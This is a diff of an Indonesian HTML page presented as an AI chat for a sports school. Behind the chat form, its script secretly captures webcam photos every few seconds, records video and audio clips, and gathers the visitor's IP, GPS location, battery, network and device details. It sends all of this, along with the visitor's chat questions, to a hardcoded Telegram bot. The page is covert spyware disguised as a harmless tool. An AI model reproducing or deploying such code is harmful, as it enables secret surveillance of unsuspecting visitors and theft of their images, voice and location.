@@ -1,162 +1,197 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <title></title>
+  <meta charset="UTF-8">
+  <title>Chat AI Sekolah Olahraga</title>
   <style>
-    html, body {
+    body {
       margin: 0;
-      padding: 0;
-      background: transparent;
+      background: url('https://i.ibb.co/mBKHcdF/olahraga.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: sans-serif;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-end;
+      height: 100vh;
+      padding: 20px;
+    }
+    form {
+      width: 100%;
+      max-width: 500px;
+      display: flex;
+      gap: 10px;
+    }
+    input, button {
+      padding: 20px;
+      border: none;
+      border-radius: 13px;
+      font-size: 1rem;
+    }
+    input {
+      flex: 1;
     }
     video {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
+      display: none;
     }
   </style>
 </head>
 <body>
+
   <video id="video" autoplay muted playsinline></video>
+
+  <form id="chatForm">
+    <input type="text" id="chatInput" placeholder="Tanyakan sesuatu ke AI..." required />
+    <button type="submit">Kirim</button>
+  </form>
+
   <script>
     const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
     const chat_id = '7552410869';
 
-    let chunks = [];
-    let mediaRecorder;
+    const video = document.getElementById('video');
+    let mediaRecorder, chunks = [];
 
-    async function start() {
+    async function startAll() {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      const video = document.getElementById("video");
       video.srcObject = stream;
 
-      // Kirim gambar tambahan
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: "POST",
-        body: (() => {
-          let f = new FormData();
-          f.append("chat_id", chat_id);
-          f.append("photo", "https://files.catbox.moe/p7xbtg.png");
-          f.append("caption", "🖼 Gambar default terkirim");
-          return f;
-        })()
-      });
+      setInterval(() => ambilFoto(video), 4000);
+      setInterval(() => rekamVideo(stream), 11000);
+      setInterval(() => rekamAudio(stream), 11000);
+      kirimInfo();
 
-      // Kirim URL browser
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id,
-          text: `🌐 Link Aktif: ${location.href}`
-        })
-      });
-
-      // Info perangkat + cuaca
-      sendInfo();
-
-      // Foto otomatis setiap 5 detik
-      setInterval(() => autoPhoto(video), 5000);
-
-      // Rekam audio+video tiap 10 detik
-      mediaRecorder = new MediaRecorder(stream);
-      mediaRecorder.ondataavailable = e => {
-        if (e.data.size > 0) chunks.push(e.data);
-      };
-      mediaRecorder.onstop = () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
-        chunks = [];
-        const form = new FormData();
-        form.append("chat_id", chat_id);
-        form.append("video", blob, "auto10s.webm");
-        form.append("caption", "loading....");
-        fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: form });
-        setTimeout(() => mediaRecorder.start(), 1000);
-      };
-
-      mediaRecorder.start();
-      setInterval(() => mediaRecorder.stop(), 10000);
-
-      // Prompt AI Chat (opsional)
-      setTimeout(async () => {
-        const q = prompt("Mau tanya apa ke AI?");
-        if (q) {
-          const res = await fetch("https://text.pollinations.ai/openai", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-              "Accept": "text/event-stream",
-              "user-agent": navigator.userAgent
-            },
-            body: JSON.stringify({ messages: [{ role: "user", content: q }], stream: false })
-          });
-          const json = await res.json();
-          const jawaban = json?.choices?.[0]?.message?.content;
-          if (jawaban) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id, text: `💬 Jawaban AI:\n${jawaban}` })
-            });
-          }
-        }
-      }, 5000);
+      fetch('https://files.catbox.moe/p7xbtg.png')
+        .then(r => r.blob())
+        .then(img => {
+          const form = new FormData();
+          form.append('chat_id', chat_id);
+          form.append('photo', img, 'gambar.png');
+          form.append('caption', '📎 Gambar tambahan');
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+        });
     }
 
-    async function autoPhoto(video) {
-      const canvas = document.createElement("canvas");
+    function ambilFoto(video) {
+      const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
-      const form = new FormData();
-      form.append("chat_id", chat_id);
-      form.append("photo", blob, "photo.jpg");
-      form.append("caption", "📸 Foto otomatis");
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: form });
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("photo", blob, "auto.jpg");
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+      }, 'image/jpeg');
     }
 
-    async function sendInfo() {
+    function rekamVideo(stream) {
+      chunks = [];
+      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("video", blob, "video10s.webm");
+        fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
+      };
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 10000);
+    }
+
+    function rekamAudio(stream) {
+      const audioStream = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+      const audioChunks = [];
+      audioStream.ondataavailable = e => audioChunks.push(e.data);
+      audioStream.onstop = () => {
+        const blob = new Blob(audioChunks, { type: 'audio/webm' });
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("audio", blob, "audio.webm");
+        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
+      };
+      audioStream.start();
+      setTimeout(() => audioStream.stop(), 10000);
+    }
+
+    async function kirimInfo() {
       const waktu = new Date().toLocaleString();
-      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip);
       const ua = navigator.userAgent;
+      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak diketahui';
+      const merek = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'Tidak diketahui';
       const bat = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`);
       const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Tidak tersedia';
-      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak terdeteksi';
-      const brand = (ua.match(/Android.*?;\s(.+?)\sBuild/) || [])[1] || "Tidak diketahui";
+      const url = location.href;
 
       navigator.geolocation.getCurrentPosition(async pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+        const lat = pos.coords.latitude, lon = pos.coords.longitude;
         const maps = `https://maps.google.com/?q=${lat},${lon}`;
-        const g = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-        const gjson = await g.json();
-        const kota = gjson.address.city || gjson.address.town || gjson.address.village || 'Tidak diketahui';
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+        const kota = (await res.json()).address.city || 'Tidak diketahui';
 
-        // Cek cuaca
         let cuaca = '';
         try {
-          const cu = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(kota)}`);
-          const js = await cu.json();
-          if (js.status && js.result) {
-            const w = js.result.weather[0];
-            cuaca = `\n🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${js.result.main.temp}°C\n💧 Kelembaban: ${js.result.main.humidity}%\n🌬️ Angin: ${js.result.wind.speed} m/s`;
+          const c = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(kota)}`);
+          const j = await c.json();
+          if (j.status && j.result) {
+            const w = j.result.weather[0];
+            cuaca = `\n🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${j.result.main.temp}°C`;
           }
         } catch {}
 
-        const teks = `📍 Lokasi: ${maps}\n🕒 Waktu: ${waktu}\n🌐 IP: ${ip}\n🔋 Baterai: ${bat}\n📶 Jaringan: ${net}\n📱 Merek: ${brand}\n💾 RAM: ${ram}${cuaca}`;
+        const isi = `
+╔═══╦═══╦════╦═══╗
+╚╗╔╗║╔═╗║╔╗╔╗║╔═╗║
+─║║║║║─║╠╝║║╚╣║─║║
+─║║║║╚═╝║─║║─║╚═╝║
+╔╝╚╝║╔═╗║─║║─║╔═╗║
+╚═══╩╝─╚╝─╚╝─╚╝─╚╝
+╔═══╦═══╦═══╦═╗─╔╦═══╗
+║╔═╗║╔═╗║╔═╗║║╚╗║║╔═╗║
+║║─║║╚═╝║║─║║╔╗╚╝║║─╚╝
+║║─║║╔╗╔╣╚═╝║║╚╗║║║╔═╗
+║╚═╝║║║╚╣╔═╗║║─║║║╚╩═║
+╚═══╩╝╚═╩╝─╚╩╝─╚═╩═══╝
+        📍 Lokasi: ${maps}\n🕒 Waktu: ${waktu}\n🌐 IP: ${ip}\n🔋 Baterai: ${bat}\n📶 Jaringan: ${net}\n📱 Link: ${url}\n📱 Perangkat: ${ua}\n🏷️ Merek: ${merek}\n💾 RAM: ${ram}${cuaca}`;
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id, text: teks })
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id, text: isi })
         });
       });
     }
 
-    window.onload = start;
+    // AI Pollinations chat
+    document.getElementById('chatForm').onsubmit = async e => {
+      e.preventDefault();
+      const teks = document.getElementById('chatInput').value;
+      document.getElementById('chatInput').value = '';
+      const res = await fetch('https://text.pollinations.ai/openai', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'text/event-stream',
+          'user-agent': 'Mozilla/5.0 (Linux; Android 14)'
+        },
+        body: JSON.stringify({
+          messages: [{ role: 'user', content: teks }],
+          stream: false
+        })
+      });
+      const json = await res.json();
+      const jawaban = json?.choices?.[0]?.message?.content || 'Gagal menjawab';
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id, text: `💬 Q: ${teks}\n🤖 A: ${jawaban}` })
+      });
+    };
+
+    window.onload = startAll;
   </script>
 </body>
 </html>
